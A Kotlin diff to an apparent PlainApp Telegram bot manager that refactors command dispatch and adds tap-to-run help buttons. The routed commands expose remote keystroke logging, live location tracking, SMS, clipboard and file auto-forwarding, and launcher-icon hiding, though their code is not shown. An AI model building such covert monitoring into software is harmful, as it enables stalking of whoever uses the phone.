@@ -648,150 +648,155 @@ object TelegramBotManager {
         val args = parts.drop(1)
         scope.launch {
             try {
-                when (command) {
-                    "start" -> cmdStart()
-                    "help" -> cmdHelp()
-                    "s", "search", "?" -> cmdSearch(args)
-                    "messages" -> cmdMessages(args)
-                    "sms" -> cmdSmsThread(args)
-                    "sendsms" -> cmdSendSms(args)
-                    "calls" -> cmdCalls(args)
-                    "recordings" -> cmdRecordings(args)
-                    "contacts" -> cmdContacts(args)
-                    "find", "findcontact", "lookup", "whois" -> cmdFind(args)
-                    "notifications" -> cmdNotifications(args)
-                    "mutenotifs", "mutenotif", "mutenotifications", "shutup", "silence" -> cmdMuteNotifs(args)
-                    "logs" -> cmdLogs(args)
-                    "files" -> cmdFiles(args)
-                    "screenshot" -> cmdScreenshot()
-                    "photo" -> cmdPhoto(args)
-                    "audio" -> cmdAudio(args)
-                    "video" -> cmdVideo(args)
-                    "apps" -> cmdApps(args)
-                    "blockapp" -> cmdBlockApp(args)
-                    "unblockapp" -> cmdUnblockApp(args)
-                    "blockedapps" -> cmdBlockedApps()
-                    "location" -> cmdLocation()
-                    "battery" -> cmdBattery()
-                    "device" -> cmdDevice()
-                    "backup", "bak", "backupdata", "exportdata" -> cmdBackup()
-                    "restore", "restoredata", "restorebackup", "importbackup" -> cmdRestore(args)
-                    "track" -> cmdTrackHub()
-                    "livelocation", "live" -> cmdLiveLocation(args)
-                    "tracklocation", "trackloc" -> cmdTrackLocation(args)
-                    "keystrokes", "keys" -> cmdKeystrokes(args)
-                    "keytop" -> cmdKeyTop()
-                    "shots", "screenshots" -> cmdShots(args)
-                    "permissions", "perms" -> cmdPermissions()
-                    "openperms", "permopen" -> cmdOpenPerms(args.getOrNull(0) ?: "")
-                    "reqperm", "reqperms", "grantperm", "askperm", "permask" -> cmdReqPerm(args.getOrNull(0) ?: "")
-                    "automations", "rules" -> cmdAutomations()
-                    "newrule", "addrule" -> cmdNewRule(args)
-                    "newschedule", "addschedule" -> cmdNewSchedule(args)
-                    "delrule", "deleterule" -> cmdDelRule(args)
-                    "runrule" -> cmdRunRule(args)
-                    "togglerule" -> cmdToggleRule(args)
-                    "notes" -> cmdNotes(args)
-                    "addnote" -> cmdAddNote()
-                    "bookmarks" -> cmdBookmarks(args)
-                    "addbookmark" -> cmdAddBookmark(args)
-                    "feeds" -> cmdFeeds()
-                    "feedentries", "feedentry" -> cmdFeedEntries(args)
-                    "music", "audios" -> cmdMusic(args)
-                    "videos", "vidlib" -> cmdVideoLibrary(args)
-                    "images", "gallery" -> cmdImages(args)
-                    "pomodoro", "pom" -> cmdPomodoro(args)
-                    "torch", "flashlight" -> cmdTorch(args)
-                    "speak", "tts" -> cmdSpeak(text.removePrefix(parts[0]).trim())
-                    "stopspeak", "shutup", "ttsstop" -> cmdStopSpeak()
-                    "vibrate" -> cmdVibrate(args)
-                    "toast" -> cmdToast(text.removePrefix(parts[0]).trim())
-                    "findphone", "ringphone" -> cmdFindPhone(args)
-                    "show", "banner" -> cmdShow(text.removePrefix(parts[0]).trim())
-                    "wake", "wakescreen" -> cmdWake(args)
-                    "brightness", "bright" -> cmdBrightness(args)
-                    "volume", "vol" -> cmdVolume(args)
-                    "launch", "open" -> cmdLaunch(args)
-                    "datasettings" -> cmdDataSettings()
-                    "bedtime" -> cmdBedtime(args)
-                    "launches", "launchhistory" -> cmdLaunches(args)
-                    "livecall", "calltracker" -> cmdLiveCall()
-                    "wifi" -> cmdWifi(args)
-                    "netusage", "datausage" -> cmdNetUsage(args)
-                    "storage", "disk" -> cmdStorage()
-                    "sim", "siminfo", "carrier" -> cmdSim()
-                    "dnd", "donotdisturb" -> cmdDnd(args)
-                    "screentime", "usagestats", "usage" -> cmdScreenTime(args)
-                    "blocknumber", "blocknum", "blockcall" -> cmdBlockNumber(args)
-                    "nowplaying", "np", "player" -> cmdNowPlaying()
-                    "forwardsms", "smsfwd" -> cmdForwardSms(args)
-                    "clipboard", "clip" -> cmdClipboard(text.removePrefix(parts[0]).trim())
-                    "mobiledata", "mobile", "data" -> cmdMobileData(args)
-                    "bluetooth", "bt" -> cmdBluetooth(args)
-                    "lockscreen", "lock" -> cmdLockScreen()
-                    "forwardphotos", "autophotos", "photofwd" -> cmdForwardPhotos(args)
-                    "airplane", "airplanemode", "aeroplane" -> cmdAirplane(args)
-                    "schedulesms", "schedsms" -> cmdScheduleSms(args)
-                    "batteryhistory", "bathistory", "bathist" -> cmdBatteryHistory(args)
-                    "vpn" -> cmdVpn()
-                    "clearcache", "cacheclean" -> cmdClearCache(args)
-                    "geofence", "gf", "geofences" -> cmdGeofence(args)
-                    "addcontact", "newcontact" -> cmdAddContact()
-                    "deletecontact", "delcontact", "rmcontact" -> cmdDeleteContact(args)
-                    "editnote" -> cmdEditNote(args)
-                    "forwardclipboard", "clipfwd", "clipmon" -> cmdForwardClipboard(args)
-                    "soundmeter", "sound", "noise", "dblevel" -> cmdSoundMeter(args)
-                    "qrcode", "qr" -> cmdQrCode(text.removePrefix(parts[0]).trim())
-                    "docs", "documents", "document" -> cmdDocs(args)
-                    "filehash", "hash", "sha256" -> cmdFileHash(args)
-                    "wifiscan", "wifilist", "scanwifi" -> cmdWifiScan()
-                    "timeline", "activity" -> cmdTimeline(args)
-                    "contactgroups", "groups", "cgroups" -> cmdContactGroups()
-                    "callnow", "dial", "makecall" -> cmdCallNow(args)
-                    "deletefile", "delfile", "rmfile" -> cmdDeleteFile(args)
-                    "networkinfo", "netinfo", "wifiinfo" -> cmdNetworkInfo()
-                    "reboot", "restart", "rebootdevice" -> cmdReboot()
-                    "mms" -> cmdMms(args)
-                    "gyroscope", "gyro", "rotation" -> cmdGyroscope()
-                    "compass", "heading", "magnetic" -> cmdCompass()
-                    "barometer", "pressure", "altitude", "baro" -> cmdBarometer()
-                    "steps", "pedometer", "stepcount", "stepcounter" -> cmdSteps()
-                    "proximity", "prox", "proxsensor" -> cmdProximity()
-                    "hotspot", "tethering", "wifiap" -> cmdHotspot(args)
-                    "setalarm", "alarm", "addalarm" -> cmdSetAlarm(args)
-                    "batteryalert", "batalert", "lowbattery" -> cmdBatteryAlert(args)
-                    "forwardgeofence", "geofencefwd", "gffwd" -> cmdForwardGeofence(args)
-                    "forwardshots", "shotsfwd", "autoshare" -> cmdForwardShots(args)
-                    "forwardfiles", "filesfwd", "autofiles", "allfiles" -> cmdForwardFiles(args)
-                    "fwdfiles", "forwardedfiles", "sentfiles" -> cmdFwdFiles(args)
-                    "filestats", "filequeue", "uploadstats" -> cmdFileStats()
-                    "retryfailed", "retryfiles", "retryuploads" -> cmdRetryFailed()
-                    "applocker", "lockapps", "perapplock" -> cmdAppLocker(args)
-                    "appsettings", "appsetting" -> cmdAppSettings()
-                    "hideicon", "launchericon", "iconhide" -> cmdHideIcon(args)
-                    "applock" -> cmdAppLockToggle(args)
-                    "biometric" -> cmdBiometric(args)
-                    "appinfog", "appinfoguard" -> cmdAppInfoGuard(args)
-                    "setpin", "changepin" -> cmdSetPin()
-                    "removepin", "deletepin" -> cmdRemovePin()
-                    "openapp", "openappdevice", "launchapp" -> cmdOpenApp()
-                    "openappinfo", "appinfo", "ownappinfo" -> cmdOpenOwnAppInfo()
-                    "openwebsettings", "websettings", "webset", "opensettings", "webcon" -> cmdOpenWebSettings()
-                    "openpage", "page", "goto", "navigate", "nav" -> cmdOpenPage()
-                    "update", "selfupdate", "apkupdate", "updateapp" -> cmdUpdate(args)
-                    "botpassword", "botpwd" -> cmdBotPassword(args)
-                    "setbotpassword", "changebotpassword", "botpwdset" -> cmdSetBotPassword()
-                    "securityqa", "securityquestion", "secqa", "feedbackqa" -> cmdSecurityQA(args)
-                    "intruders", "captures", "intrudercaptures" -> scope.launch { cmdIntruderCaptures(args) }
-                    "deviceowner", "dpm", "owner", "admincontrol" -> cmdDeviceOwner(args)
-                    "commands" -> cmdCommands()
-                    "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
-                    else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
-                }
+                dispatchCommand(command, args, text)
             } catch (e: Exception) {
                 LogCat.e("TelegramBot cmd $command error: ${e.message}")
                 sendMessage("❌ Error running /$command: ${htmlEsc(e.message ?: "unknown")}")
             }
+        }
+    }
+
+    private suspend fun dispatchCommand(command: String, args: List<String>, fullText: String = "") {
+        val afterCmd = if (fullText.isNotBlank()) fullText.removePrefix("/${command}").removePrefix(" ").trim() else args.joinToString(" ")
+        when (command) {
+            "start" -> cmdStart()
+            "help" -> cmdHelp()
+            "s", "search", "?" -> cmdSearch(args)
+            "messages" -> cmdMessages(args)
+            "sms" -> cmdSmsThread(args)
+            "sendsms" -> cmdSendSms(args)
+            "calls" -> cmdCalls(args)
+            "recordings" -> cmdRecordings(args)
+            "contacts" -> cmdContacts(args)
+            "find", "findcontact", "lookup", "whois" -> cmdFind(args)
+            "notifications" -> cmdNotifications(args)
+            "mutenotifs", "mutenotif", "mutenotifications", "shutup", "silence" -> cmdMuteNotifs(args)
+            "logs" -> cmdLogs(args)
+            "files" -> cmdFiles(args)
+            "screenshot" -> cmdScreenshot()
+            "photo" -> cmdPhoto(args)
+            "audio" -> cmdAudio(args)
+            "video" -> cmdVideo(args)
+            "apps" -> cmdApps(args)
+            "blockapp" -> cmdBlockApp(args)
+            "unblockapp" -> cmdUnblockApp(args)
+            "blockedapps" -> cmdBlockedApps()
+            "location" -> cmdLocation()
+            "battery" -> cmdBattery()
+            "device" -> cmdDevice()
+            "backup", "bak", "backupdata", "exportdata" -> cmdBackup()
+            "restore", "restoredata", "restorebackup", "importbackup" -> cmdRestore(args)
+            "track" -> cmdTrackHub()
+            "livelocation", "live" -> cmdLiveLocation(args)
+            "tracklocation", "trackloc" -> cmdTrackLocation(args)
+            "keystrokes", "keys" -> cmdKeystrokes(args)
+            "keytop" -> cmdKeyTop()
+            "shots", "screenshots" -> cmdShots(args)
+            "permissions", "perms" -> cmdPermissions()
+            "openperms", "permopen" -> cmdOpenPerms(args.getOrNull(0) ?: "")
+            "reqperm", "reqperms", "grantperm", "askperm", "permask" -> cmdReqPerm(args.getOrNull(0) ?: "")
+            "automations", "rules" -> cmdAutomations()
+            "newrule", "addrule" -> cmdNewRule(args)
+            "newschedule", "addschedule" -> cmdNewSchedule(args)
+            "delrule", "deleterule" -> cmdDelRule(args)
+            "runrule" -> cmdRunRule(args)
+            "togglerule" -> cmdToggleRule(args)
+            "notes" -> cmdNotes(args)
+            "addnote" -> cmdAddNote()
+            "bookmarks" -> cmdBookmarks(args)
+            "addbookmark" -> cmdAddBookmark(args)
+            "feeds" -> cmdFeeds()
+            "feedentries", "feedentry" -> cmdFeedEntries(args)
+            "music", "audios" -> cmdMusic(args)
+            "videos", "vidlib" -> cmdVideoLibrary(args)
+            "images", "gallery" -> cmdImages(args)
+            "pomodoro", "pom" -> cmdPomodoro(args)
+            "torch", "flashlight" -> cmdTorch(args)
+            "speak", "tts" -> cmdSpeak(afterCmd)
+            "stopspeak", "ttsstop" -> cmdStopSpeak()
+            "vibrate" -> cmdVibrate(args)
+            "toast" -> cmdToast(afterCmd)
+            "findphone", "ringphone" -> cmdFindPhone(args)
+            "show", "banner" -> cmdShow(afterCmd)
+            "wake", "wakescreen" -> cmdWake(args)
+            "brightness", "bright" -> cmdBrightness(args)
+            "volume", "vol" -> cmdVolume(args)
+            "launch", "open" -> cmdLaunch(args)
+            "datasettings" -> cmdDataSettings()
+            "bedtime" -> cmdBedtime(args)
+            "launches", "launchhistory" -> cmdLaunches(args)
+            "livecall", "calltracker" -> cmdLiveCall()
+            "wifi" -> cmdWifi(args)
+            "netusage", "datausage" -> cmdNetUsage(args)
+            "storage", "disk" -> cmdStorage()
+            "sim", "siminfo", "carrier" -> cmdSim()
+            "dnd", "donotdisturb" -> cmdDnd(args)
+            "screentime", "usagestats", "usage" -> cmdScreenTime(args)
+            "blocknumber", "blocknum", "blockcall" -> cmdBlockNumber(args)
+            "nowplaying", "np", "player" -> cmdNowPlaying()
+            "forwardsms", "smsfwd" -> cmdForwardSms(args)
+            "clipboard", "clip" -> cmdClipboard(afterCmd)
+            "mobiledata", "mobile", "data" -> cmdMobileData(args)
+            "bluetooth", "bt" -> cmdBluetooth(args)
+            "lockscreen", "lock" -> cmdLockScreen()
+            "forwardphotos", "autophotos", "photofwd" -> cmdForwardPhotos(args)
+            "airplane", "airplanemode", "aeroplane" -> cmdAirplane(args)
+            "schedulesms", "schedsms" -> cmdScheduleSms(args)
+            "batteryhistory", "bathistory", "bathist" -> cmdBatteryHistory(args)
+            "vpn" -> cmdVpn()
+            "clearcache", "cacheclean" -> cmdClearCache(args)
+            "geofence", "gf", "geofences" -> cmdGeofence(args)
+            "addcontact", "newcontact" -> cmdAddContact()
+            "deletecontact", "delcontact", "rmcontact" -> cmdDeleteContact(args)
+            "editnote" -> cmdEditNote(args)
+            "forwardclipboard", "clipfwd", "clipmon" -> cmdForwardClipboard(args)
+            "soundmeter", "sound", "noise", "dblevel" -> cmdSoundMeter(args)
+            "qrcode", "qr" -> cmdQrCode(afterCmd)
+            "docs", "documents", "document" -> cmdDocs(args)
+            "filehash", "hash", "sha256" -> cmdFileHash(args)
+            "wifiscan", "wifilist", "scanwifi" -> cmdWifiScan()
+            "timeline", "activity" -> cmdTimeline(args)
+            "contactgroups", "groups", "cgroups" -> cmdContactGroups()
+            "callnow", "dial", "makecall" -> cmdCallNow(args)
+            "deletefile", "delfile", "rmfile" -> cmdDeleteFile(args)
+            "networkinfo", "netinfo", "wifiinfo" -> cmdNetworkInfo()
+            "reboot", "restart", "rebootdevice" -> cmdReboot()
+            "mms" -> cmdMms(args)
+            "gyroscope", "gyro", "rotation" -> cmdGyroscope()
+            "compass", "heading", "magnetic" -> cmdCompass()
+            "barometer", "pressure", "altitude", "baro" -> cmdBarometer()
+            "steps", "pedometer", "stepcount", "stepcounter" -> cmdSteps()
+            "proximity", "prox", "proxsensor" -> cmdProximity()
+            "hotspot", "tethering", "wifiap" -> cmdHotspot(args)
+            "setalarm", "alarm", "addalarm" -> cmdSetAlarm(args)
+            "batteryalert", "batalert", "lowbattery" -> cmdBatteryAlert(args)
+            "forwardgeofence", "geofencefwd", "gffwd" -> cmdForwardGeofence(args)
+            "forwardshots", "shotsfwd", "autoshare" -> cmdForwardShots(args)
+            "forwardfiles", "filesfwd", "autofiles", "allfiles" -> cmdForwardFiles(args)
+            "fwdfiles", "forwardedfiles", "sentfiles" -> cmdFwdFiles(args)
+            "filestats", "filequeue", "uploadstats" -> cmdFileStats()
+            "retryfailed", "retryfiles", "retryuploads" -> cmdRetryFailed()
+            "applocker", "lockapps", "perapplock" -> cmdAppLocker(args)
+            "appsettings", "appsetting" -> cmdAppSettings()
+            "hideicon", "launchericon", "iconhide" -> cmdHideIcon(args)
+            "applock" -> cmdAppLockToggle(args)
+            "biometric" -> cmdBiometric(args)
+            "appinfog", "appinfoguard" -> cmdAppInfoGuard(args)
+            "setpin", "changepin" -> cmdSetPin()
+            "removepin", "deletepin" -> cmdRemovePin()
+            "openapp", "openappdevice", "launchapp" -> cmdOpenApp()
+            "openappinfo", "appinfo", "ownappinfo" -> cmdOpenOwnAppInfo()
+            "openwebsettings", "websettings", "webset", "opensettings", "webcon" -> cmdOpenWebSettings()
+            "openpage", "page", "goto", "navigate", "nav" -> cmdOpenPage()
+            "update", "selfupdate", "apkupdate", "updateapp" -> cmdUpdate(args)
+            "botpassword", "botpwd" -> cmdBotPassword(args)
+            "setbotpassword", "changebotpassword", "botpwdset" -> cmdSetBotPassword()
+            "securityqa", "securityquestion", "secqa", "feedbackqa" -> cmdSecurityQA(args)
+            "intruders", "captures", "intrudercaptures" -> scope.launch { cmdIntruderCaptures(args) }
+            "deviceowner", "dpm", "owner", "admincontrol" -> cmdDeviceOwner(args)
+            "commands" -> cmdCommands()
+            "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
+            else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
         }
     }
 
@@ -1874,6 +1879,14 @@ object TelegramBotManager {
                         pendingRestoreUntil = 0L
                         cmdRestoreViaUpload()
                     }
+                    // ---- Run command from help/search button ----
+                    "run" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "▶️ Running /$rest…")
+                        val parts = rest.trim().split(" ")
+                        val cmd = parts.firstOrNull()?.lowercase() ?: return@launch
+                        val cmdArgs = parts.drop(1)
+                        dispatchCommand(cmd, cmdArgs)
+                    }
                     // ---- Bedtime ----
                     "bt_on" -> {
                         val cur = com.ismartcoding.plain.services.AppBlockHelper.getBedtime()
@@ -2637,22 +2650,23 @@ object TelegramBotManager {
         sb.append("\n━━━━━━━━━━━━━━━━━━━\n\n")
 
         for ((key, desc) in top) {
-            sb.append("📌 <code>/$key</code>\n")
-            sb.append("   📝 $desc\n")
+            sb.append("📌 <b>/$key</b>\n")
+            sb.append("   $desc\n")
             val aliases = cmdAliases[key]
             if (!aliases.isNullOrEmpty()) {
-                sb.append("   🏷 ${aliases.joinToString("  ·  ") { "<code>/$it</code>" }}\n")
+                sb.append("   🏷 ${aliases.take(3).joinToString("  ·  ") { "/$it" }}\n")
             }
             sb.append("\n")
         }
 
         if (matches.size > 12) {
-            sb.append("<i>Showing top 12 — refine your keyword for narrower results.\nUse /commands to browse all categories.</i>")
+            sb.append("<i>Showing top 12 — refine your keyword for narrower results.</i>")
         } else {
-            sb.append("<i>Use /commands to browse all ${allCommands.size} commands by category.</i>")
+            sb.append("<i>Tap a button below to run the command.</i>")
         }
 
-        sendMessage(sb.toString())
+        val rows = top.chunked(2).map { chunk -> chunk.map { (key, _) -> "/$key" to "run:$key" } }
+        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
     }
 
     private suspend fun cmdHelp() {
@@ -2662,11 +2676,11 @@ object TelegramBotManager {
             Section("🔍 Search & Help", listOf("s","help","commands")),
             Section("💬 Communication", listOf("messages","sms","sendsms","mms","schedulesms","calls","livecall","callnow","recordings","forwardsms")),
             Section("👥 Contacts", listOf("contacts","find","addcontact","deletecontact","blocknumber")),
-            Section("📁 Files & Storage", listOf("files","storage","docs","find","filehash","deletefile")),
+            Section("📁 Files & Storage", listOf("files","storage","docs","filehash","deletefile")),
             Section("📸 Media", listOf("screenshot","photo","audio","video","music","videos","images","shots","forwardphotos","forwardshots")),
             Section("📱 Apps", listOf("apps","blockapp","unblockapp","blockedapps","launch","screentime","launches","clearcache")),
             Section("📦 Backup & Restore", listOf("backup","restore")),
-            Section("📊 Device Info", listOf("device","battery","batteryhistory","batteryalert","location","sim","vpn","permissions","networkinfo","wifiscan","netusage")),
+            Section("📊 Device Info", listOf("device","battery","batteryhistory","location","sim","vpn","permissions","networkinfo","wifiscan","netusage")),
             Section("🔧 Device Controls", listOf("wifi","hotspot","bluetooth","airplane","mobiledata","dnd","brightness","volume","torch","lockscreen","reboot")),
             Section("🌀 Sensors", listOf("gyroscope","compass","barometer","steps","proximity","soundmeter")),
             Section("🛰 Tracking & Monitoring", listOf("track","livelocation","tracklocation","keystrokes","keytop","geofence","forwardgeofence","timeline")),
@@ -2674,35 +2688,47 @@ object TelegramBotManager {
             Section("📝 Productivity", listOf("notes","addnote","editnote","bookmarks","addbookmark","feeds","feedentries","pomodoro","clipboard","forwardclipboard","qrcode")),
             Section("🔔 Notifications", listOf("notifications","mutenotifs","logs")),
             Section("🚨 Alerts & Actions", listOf("findphone","vibrate","speak","stopspeak","toast","show","wake","setalarm","batteryalert")),
-            Section("⏰ Scheduling", listOf("schedulesms","setalarm","bedtime","newschedule")),
             Section("📡 Auto-Forward", listOf("forwardsms","forwardphotos","forwardclipboard","forwardshots","forwardgeofence","forwardfiles","fwdfiles","filestats","retryfailed")),
-            Section("🔐 Security & App Settings", listOf("appsettings","applocker","hideicon","applock","biometric","appinfog","setpin","removepin","openapp","openappinfo","openwebsettings","botpassword","setbotpassword","securityqa","update","intruders","permissions","openperms","reqperm")),
+            Section("🔐 Security & Settings", listOf("appsettings","applocker","hideicon","applock","biometric","appinfog","setpin","removepin","botpassword","setbotpassword","securityqa","update","intruders","openperms","reqperm")),
             Section("🤖 Bot", listOf("start","help","commands","stop","nowplaying")),
         )
         val cmdMap = allCommands.toMap()
         val shown = mutableSetOf<String>()
-        val sb = StringBuilder("📖 <b>PlainApp Bot — Command Reference</b>\n")
-        sb.append("<i>${allCommands.size} commands total</i>\n\n")
+
+        // Header message
+        sendMessage(
+            "📖 <b>PlainApp Bot — Command Reference</b>\n" +
+            "<i>${allCommands.size} commands  ·  tap any button to run it</i>\n\n" +
+            "💡 Use /s &lt;keyword&gt; to search, e.g. <code>/s wifi</code>"
+        )
+
         for (section in sections) {
             val sectionCmds = section.cmds.filter { it in cmdMap && shown.add(it) }
             if (sectionCmds.isEmpty()) continue
-            sb.append("${section.header}\n")
+
+            // Build description text for this section
+            val sb = StringBuilder("${section.header}\n")
             for (cmd in sectionCmds) {
                 val desc = cmdMap[cmd] ?: continue
-                val cleanDesc = desc.replace(Regex("<[^>]+>"), "").substringBefore(" — ").let { desc }
-                sb.append("  /<code>$cmd</code> — $cleanDesc\n")
+                sb.append("  <b>/$cmd</b> — $desc\n")
             }
-            sb.append("\n")
+
+            // Build 3-per-row inline buttons
+            val btnRows = sectionCmds.chunked(3).map { row ->
+                row.map { cmd -> "/$cmd" to "run:$cmd" }
+            }
+
+            sendMessage(sb.toString().trimEnd(), replyMarkup = TelegramApiClient.inlineKeyboard(btnRows))
         }
-        // Any not yet shown
+
+        // Anything not in any section
         val remaining = allCommands.filter { it.first !in shown }
         if (remaining.isNotEmpty()) {
-            sb.append("🔹 Other\n")
-            remaining.forEach { (cmd, desc) -> sb.append("  /<code>$cmd</code> — $desc\n") }
-            sb.append("\n")
+            val sb = StringBuilder("🔹 <b>Other</b>\n")
+            remaining.forEach { (cmd, desc) -> sb.append("  <b>/$cmd</b> — $desc\n") }
+            val btnRows = remaining.chunked(3).map { chunk -> chunk.map { (cmd, _) -> "/$cmd" to "run:$cmd" } }
+            sendMessage(sb.toString().trimEnd(), replyMarkup = TelegramApiClient.inlineKeyboard(btnRows))
         }
-        sb.append("💡 <i>Live alerts auto-forward for calls, SMS, notifications & location.</i>")
-        sendChunked(sb.toString())
     }
 
     private suspend fun cmdMessages(args: List<String>) {
